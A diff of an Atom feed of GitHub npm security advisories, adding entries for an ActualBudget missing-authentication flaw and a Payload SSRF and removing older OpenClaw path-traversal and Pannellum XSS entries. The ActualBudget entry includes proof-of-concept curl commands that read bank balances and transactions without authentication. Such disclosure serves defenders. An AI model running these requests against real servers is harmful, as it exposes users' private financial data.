@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-02-24T20:01:11.424Z</updated>
+    <updated>2026-02-24T20:48:31.618Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,186 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@actual-app/sync-server] ActualBudget server is Missing Authentication for SimpleFIN and Pluggy AI bank sync endpoints]]></title>
+        <id>https://github.com/advisories/GHSA-m2cq-xjgm-f668</id>
+        <link href="https://github.com/advisories/GHSA-m2cq-xjgm-f668"/>
+        <updated>2026-02-24T20:13:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Missing authentication middleware in the ActualBudget server component allows any unauthenticated user to query the SimpleFIN and Pluggy.ai integration endpoints and read sensitive bank account balance and transaction information.</p>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows an unauthenticated attacker to read the bank account balance and transaction history of ActualBudget users. This vulnerability impacts all ActualBudget Server users with the SimpleFIN or Pluggy.ai integrations configured. The ActualBudget Server instance must be reachable over the network.</p>
+<h3 id="details">Details</h3>
+<p>The ActualBudget server component allows for integration with SimpleFIN and Pluggy.ai services. These services read bank account balances and transaction data from users' banks and return the data to ActualBudget. The affected endpoints facilitate this integration and are intended to be used only by logged in users for the purposes of syncing bank transaction data.</p>
+<p>The vulnerable source code is in the following files in the <code>actualbudget/actual</code> GitHub repository (<a href="https://github.com/actualbudget/actual/">https://github.com/actualbudget/actual/</a>):</p>
+<ul>
+<li><code>/packages/sync-server/src/app-simplefin/app-simplefin.js</code></li>
+<li><code>/packages/sync-server/src/app-pluggyai/app-pluggyai.js</code></li>
+</ul>
+<p>The sensitive endpoints missing authentication are:</p>
+<ul>
+<li><code>POST /simplefin/status</code></li>
+<li><code>POST /simplefin/accounts</code></li>
+<li><code>POST /simplefin/transactions</code></li>
+<li><code>POST /pluggyai/status</code></li>
+<li><code>POST /pluggyai/accounts</code></li>
+<li><code>POST /pluggyai/transactions</code></li>
+</ul>
+<p>The following source code is an example of an integration that implements the authentication middleware (<code>packages/sync-server/src/app-gocardless/app-gocardless.js</code>):</p>
+<pre><code class="language-js">const app = express();
+app.use(requestLoggerMiddleware);
+...
+app.use(express.json());
+app.use(validateSessionMiddleware); // &lt;-- Uses authentication
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>The below commands exploit this vulnerability on both the SimpleFIN and Pluggy.ai endpoints. No authentication is required. Network access is required.</p>
+<p>SimpleFIN:</p>
+<pre><code class="language-bash"># Check if SimpleFIN is configured
+curl -X POST "https://&lt;actualbudgethost&gt;/simplefin/status"
+
+# List SimpleFIN accounts
+curl -X POST "https://&lt;actualbudgethost&gt;/simplefin/accounts"
+
+# List SimpleFIN transactions with an account ID from the previous request
+curl -X POST "https://&lt;actualbudgethost&gt;/simplefin/transactions" -H "Content-Type: application/json" -d '{"accountId":["ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"],"startDate":["2026-02-01"]}'
+</code></pre>
+<p>PluggyAI:</p>
+<pre><code class="language-bash"># Check if PluggyAI is configured
+curl -X POST "https://&lt;actualbudgethost&gt;/pluggyai/status"
+
+# List Pluggy.ai accounts
+curl -X POST "https://&lt;actualbudgethost&gt;/pluggyai/accounts"
+
+# List Pluggy.ai transactions with an account ID from the previous request
+curl -X POST "https://&lt;actualbudgethost&gt;/pluggyai/transactions" -H "Content-Type: application/json" -d '{"accountId":["ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"],"startDate":["2026-02-01"]}'
+</code></pre>
+<p>Example response from <code>POST /simplefin/accounts</code>:</p>
+<pre><code class="language-json">{
+    "status": "ok",
+    "data": {
+        "accounts": [
+            {
+                "id": "ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX",
+                "name": "CHEQUING ACCOUNT",
+                "currency": "CAD",
+                "balance": "1234.56",
+                "available-balance": "0.00",
+                "balance-date": 1771531758,
+                "transactions": [],
+                "holdings": [],
+                "org": {
+                    "domain": "www.cibc.com",
+                    "name": "CIBC",
+                    "sfin-url": "https://beta-bridge.simplefin.org/simplefin",
+                    "url": "https://www.cibconline.cibc.com",
+                    "id": "www.cibconline.cibc.com"
+                }
+            },
+            ...
+        ]
+    }
+}
+</code></pre>
+<p>Example response from <code>POST /simplefin/transactions</code>:</p>
+<pre><code class="language-json">{
+    "status": "ok",
+    "data": {
+        "ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX": {
+            "balances": [
+                {
+                    "balanceAmount": {
+                        "amount": "1234.56",
+                        "currency": "CAD"
+                    },
+                    "balanceType": "expected",
+                    "referenceDate": "2026-02-19"
+                },
+                {
+                    "balanceAmount": {
+                        "amount": "1234.56",
+                        "currency": "CAD"
+                    },
+                    "balanceType": "interimAvailable",
+                    "referenceDate": "2026-02-19"
+                }
+            ],
+            "startingBalance": 123456,
+            "transactions": {
+                "all": [
+                    {
+                        "booked": true,
+                        "sortOrder": 1771502400,
+                        "date": "2026-02-19",
+                        "payeeName": "E-Transfer",
+                        "notes": "SEND E-TFR ***ABC",
+                        "transactionAmount": {
+                            "amount": "-12.00",
+                            "currency": "USD"
+                        },
+                        "transactionId": "TRN-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX",
+                        "transactedDate": "2026-02-19",
+                        "postedDate": "2026-02-19"
+                    },
+                    ...
+                ],
+                "pending": []
+            }
+        }
+    }
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-m2cq-xjgm-f668">https://github.com/actualbudget/actual/security/advisories/GHSA-m2cq-xjgm-f668</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27584">https://nvd.nist.gov/vuln/detail/CVE-2026-27584</a></li>
+<li><a href="https://github.com/actualbudget/actual/commit/ea937d100956ca56689ff852d99c28589e2a7d88">https://github.com/actualbudget/actual/commit/ea937d100956ca56689ff852d99c28589e2a7d88</a></li>
+<li><a href="https://github.com/advisories/GHSA-m2cq-xjgm-f668">https://github.com/advisories/GHSA-m2cq-xjgm-f668</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m2cq-xjgm-f668</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-02-24T20:13:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[payload] Payload: Server-Side Request Forgery (SSRF) in External File URL Uploads]]></title>
+        <id>https://github.com/advisories/GHSA-hhfx-5x8j-f5f6</id>
+        <link href="https://github.com/advisories/GHSA-hhfx-5x8j-f5f6"/>
+        <updated>2026-02-24T20:10:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>A Server-Side Request Forgery (SSRF) vulnerability exists in Payload's external file upload functionality. When processing external URLs for file uploads, insufficient validation of HTTP redirects could allow an authenticated attacker to access internal network resources.</p>
+<p><strong>Users are affected if ALL of these are true</strong>:</p>
+<ul>
+<li>Payload version &lt; v3.75.0</li>
+<li>At least one collection with <code>upload</code> enabled</li>
+<li>A user has <code>create</code> access to that upload-enabled collection</li>
+</ul>
+<p>An authenticated user with upload collection write permissions could potentially access internal services. Response content from internal services could be retrieved through the application.</p>
+<h3 id="patches">Patches</h3>
+<p>This vulnerability has been patched in v3.75.0. Users should upgrade to v3.75.0 or later.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If users cannot upgrade immediately, they can mitigate this vulnerability by disabling external file uploads via the <code>disableExternalFile</code> upload collection option, or by restricting <code>create</code> access on upload-enabled collections to <strong>trusted users only</strong>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-hhfx-5x8j-f5f6">https://github.com/payloadcms/payload/security/advisories/GHSA-hhfx-5x8j-f5f6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27567">https://nvd.nist.gov/vuln/detail/CVE-2026-27567</a></li>
+<li><a href="https://github.com/payloadcms/payload/commit/1041bb6">https://github.com/payloadcms/payload/commit/1041bb6</a></li>
+<li><a href="https://github.com/payloadcms/payload/releases/tag/v3.75.0">https://github.com/payloadcms/payload/releases/tag/v3.75.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-hhfx-5x8j-f5f6">https://github.com/advisories/GHSA-hhfx-5x8j-f5f6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hhfx-5x8j-f5f6</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-24T20:10:32.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@oneuptime/common] OneUptime:: node:vm sandbox escape in probe allows any project member to achieve RCE]]></title>
         <id>https://github.com/advisories/GHSA-v264-xqh4-9xmm</id>
@@ -825,83 +1005,5 @@ entities[entityName] = {
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-02-19T22:06:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw has a path traversal in apply_patch could write/delete files outside the workspace]]></title>
-        <id>https://github.com/advisories/GHSA-r5fq-947m-xm57</id>
-        <link href="https://github.com/advisories/GHSA-r5fq-947m-xm57"/>
-        <updated>2026-02-19T20:46:01.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>In affected versions, when <code>apply_patch</code> was enabled and the agent ran without filesystem sandbox containment, crafted paths could cause file writes/deletes outside the configured workspace directory.</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code> (npm)</li>
-<li>Affected: <code>&lt;= 2026.2.13</code></li>
-<li>Fixed: <code>&gt;= 2026.2.14</code></li>
-</ul>
-<h2 id="details">Details</h2>
-<p>The non-sandbox path resolution in <code>apply_patch</code> did not enforce workspace containment. Inputs like <code>../../...</code> or absolute paths could escape the working directory in non-sandboxed mode.</p>
-<h2 id="impact">Impact</h2>
-<p>Practical impact depends on deployment and who can trigger tool execution. This is most relevant when tool invocation is exposed to less-trusted callers or when operators expected workspace-only containment.</p>
-<h2 id="workarounds">Workarounds</h2>
-<ul>
-<li>Keep <code>tools.exec.applyPatch.enabled</code> disabled if you do not need <code>apply_patch</code>.</li>
-<li>Keep <code>tools.exec.applyPatch.workspaceOnly</code> at its secure default of <code>true</code>.</li>
-<li>Restrict who can trigger tool execution (and which tools are allowlisted).</li>
-</ul>
-<h2 id="configuration-note">Configuration Note</h2>
-<p><code>tools.exec.applyPatch.workspaceOnly: false</code> intentionally opts out of workspace containment and can re-enable outside-workspace writes/deletes.</p>
-<h2 id="fix">Fix</h2>
-<ul>
-<li>PR: <a href="https://github.com/openclaw/openclaw/pull/16405">https://github.com/openclaw/openclaw/pull/16405</a></li>
-<li>Merge commit: <code>5544646a09c0121fca7d7093812dc2de8437c7f1</code></li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>Thanks to @p80n-sec for reporting this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-r5fq-947m-xm57">https://github.com/openclaw/openclaw/security/advisories/GHSA-r5fq-947m-xm57</a></li>
-<li><a href="https://github.com/openclaw/openclaw/pull/16405">https://github.com/openclaw/openclaw/pull/16405</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/5544646a09c0121fca7d7093812dc2de8437c7f1">https://github.com/openclaw/openclaw/commit/5544646a09c0121fca7d7093812dc2de8437c7f1</a></li>
-<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.2.14">https://github.com/openclaw/openclaw/releases/tag/v2026.2.14</a></li>
-<li><a href="https://github.com/advisories/GHSA-r5fq-947m-xm57">https://github.com/advisories/GHSA-r5fq-947m-xm57</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r5fq-947m-xm57</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-19T20:45:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pannellum] Pannellum has a XSS vulnerability in hot spot attributes]]></title>
-        <id>https://github.com/advisories/GHSA-8423-w5wx-h2r6</id>
-        <link href="https://github.com/advisories/GHSA-8423-w5wx-h2r6"/>
-        <updated>2026-02-23T22:27:55.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The hot spot <code>attributes</code> configuration property allowed any attribute to be set, including HTML event handler attributes, allowing for potential XSS attacks. This affects websites hosting the standalone viewer HTML file and any other use of untrusted JSON config files (bypassing the protections of the <code>escapeHTML</code> parameter). As certain events fire without any additional user interaction, visiting a standalone viewer URL that points to a malicious config file—without additional user interaction—is sufficient to trigger the vulnerability and execute arbitrary JavaScript code, which can, for example, replace the contents of the page with arbitrary content and make it appear to be hosted by the website hosting the standalone viewer HTML file.</p>
-<h3 id="patches">Patches</h3>
-<p>This has been fixed both in v2.5.7 and in the current development branch.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Setting the <code>Content-Security-Policy</code> header to <code>script-src-attr 'none'</code> will block execution of inline event handlers, mitigating this vulnerability. Don't host <code>pannellum.htm</code> on a domain that shares cookies with user authentication to mitigate XSS risk.</p>
-<h3 id="acknowledgments">Acknowledgments</h3>
-<p>Reported both by luminary (@lumin9ry), Visvge (@Sicclord1 / @Visvge), and sutol (@0x5a6163 / @SUT0L) and by another researcher who wishes not to be named at this time.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mpetroff/pannellum/security/advisories/GHSA-8423-w5wx-h2r6">https://github.com/mpetroff/pannellum/security/advisories/GHSA-8423-w5wx-h2r6</a></li>
-<li><a href="https://github.com/mpetroff/pannellum/commit/9391ef8da6a6a98c6a9f8c97f101adb900523681">https://github.com/mpetroff/pannellum/commit/9391ef8da6a6a98c6a9f8c97f101adb900523681</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27210">https://nvd.nist.gov/vuln/detail/CVE-2026-27210</a></li>
-<li><a href="https://github.com/advisories/GHSA-8423-w5wx-h2r6">https://github.com/advisories/GHSA-8423-w5wx-h2r6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8423-w5wx-h2r6</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-02-19T20:44:48.000Z</published>
     </entry>
 </feed>
